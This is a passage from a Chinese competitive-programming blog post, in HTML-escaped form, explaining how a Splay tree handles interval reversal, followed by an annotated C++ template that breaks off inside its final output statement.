&lt;p&gt;右旋（下面代码里的表达:把E往上转一次）→&lt;img src=&#34;https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180222235503124-141509937.gif&#34; alt=&#34;右旋&#34; loading=&#34;lazy&#34;&gt;  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;图片来源：&lt;a href=&#34;//blog.csdn.net/sun_tttt/article/details/65445754&#34;&gt;http://blog.csdn.net/sun_tttt&amp;#x2F;article&amp;#x2F;details&amp;#x2F;65445754&lt;/a&gt;&lt;br&gt;(文章是介绍红黑树的但是这个左旋右旋操作二叉搜索树通用)&lt;br&gt;论文里讲的很详细~&lt;br&gt;具体到这道题，引用一下zcysky在题解里给出的解释：  &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Splay可以用来维护序列。这样的话是把Splay当作一棵区间树。  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;所谓区间树和权值树的区别，大概就是区间树每个节点代表的是一段区间（典型代表就是一般的线段树）  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;权值树好理解一点，就是每个点真的代表一个点。  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;至于翻转操作我们可以利用Splay的过程实现。详见代码。(Splay能维护序列反转也是它作为LCT的辅助树的条件之一)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;作为模板题没什么好说的。这边文章主要记录板子用。感谢zcysky的板子。   &lt;/p&gt;
&lt;h2 id&gt;&lt;a href=&#34;#&#34; class=&#34;headerlink&#34; title&gt;&lt;/a&gt;&lt;img src=&#34;https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180223172902355-916514534.gif&#34; loading=&#34;lazy&#34;&gt;&lt;/h2&gt;&lt;h3 id=&#34;代码&#34;&gt;&lt;a href=&#34;#代码&#34; class=&#34;headerlink&#34; title=&#34;代码&#34;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; N 100005&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n,m; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fa[N],ch[N][&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],size[N],rev[N],rt;&lt;span class=&#34;comment&#34;&gt;//fa[a]表示a的父亲&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;pushup&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//维护节点大小&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    size[x]=size[ch[x][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]]+size[ch[x][&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]]+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;pushdown&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//标记下传&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(rev[x])&amp;#123;&lt;span class=&#34;comment&#34;&gt;//是否翻转了区间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;swap&lt;/span&gt;(ch[x][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],ch[x][&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rev[ch[x][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]]^=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;rev[ch[x][&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]]^=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;rev[x]=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;isLeft&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ch[fa[x]][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] == x;&amp;#125;&lt;span class=&#34;comment&#34;&gt;//判断x是不是左儿子&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;rotate&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;k)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//旋转&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y=fa[x],z=fa[y];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; kind=&lt;span class=&#34;built_in&#34;&gt;isLeft&lt;/span&gt;(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(y==k)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        k=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch[z][!&lt;span class=&#34;built_in&#34;&gt;isLeft&lt;/span&gt;(y)]=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ch[y][!kind]=ch[x][kind];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fa[ch[y][!kind]]=y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ch[x][kind]=y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fa[y]=x;fa[x]=z;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;pushup&lt;/span&gt;(x);&lt;span class=&#34;built_in&#34;&gt;pushup&lt;/span&gt;(y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;splay&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;k)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//伸展操作，将x一直旋转直到x就是k&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(x!=k)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y=fa[x],z=fa[y];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(y!=k)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        	&lt;span class=&#34;built_in&#34;&gt;isLeft&lt;/span&gt;(x)^&lt;span class=&#34;built_in&#34;&gt;isLeft&lt;/span&gt;(y) ? &lt;span class=&#34;built_in&#34;&gt;rotate&lt;/span&gt;(x,k):&lt;span class=&#34;built_in&#34;&gt;rotate&lt;/span&gt;(y,k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;comment&#34;&gt;//该节点与父亲分别是他们爸的左孩子\右孩子或者是右孩子\左孩子旋转2次x&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;comment&#34;&gt;//该节点与父亲同是他们爸的左孩子或同是右孩子先旋转一次y再旋转一次x&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;rotate&lt;/span&gt;(x,k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; r,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; f)&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//建立一颗完全平衡的二叉树&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(l&amp;gt;r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; mid=(l+r)/&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ch[f][!(mid&amp;lt;f)]=mid;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fa[mid]=f;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    size[mid]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(l==r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(l,mid&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,mid);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(mid+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,r,mid);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;pushup&lt;/span&gt;(mid);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//寻找以x为根的子树里第k大的&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;pushdown&lt;/span&gt;(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; s=size[ch[x][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(k==s+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(k&amp;lt;=s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(ch[x][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(ch[x][&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;],k-s&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;rever&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; r)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//关于如何从Splay中提取区间请看上文思路中的论文&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x=&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(rt,l),y=&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(rt,r+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;splay&lt;/span&gt;(x,rt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;splay&lt;/span&gt;(y,ch[x][&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; z=ch[y][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rev[z]^=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d&amp;quot;&lt;/span&gt;,&amp;amp;n,&amp;amp;m);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rt=(n+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,n+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,rt);&lt;span class=&#34;comment&#34;&gt;//区间左右各多加1个数方便提取区间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=m;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; L,R;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d&amp;quot;&lt;/span&gt;,&amp;amp;L,&amp;amp;R);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;rever&lt;/span&gt;(L,R);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;i&amp;lt;=n+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d 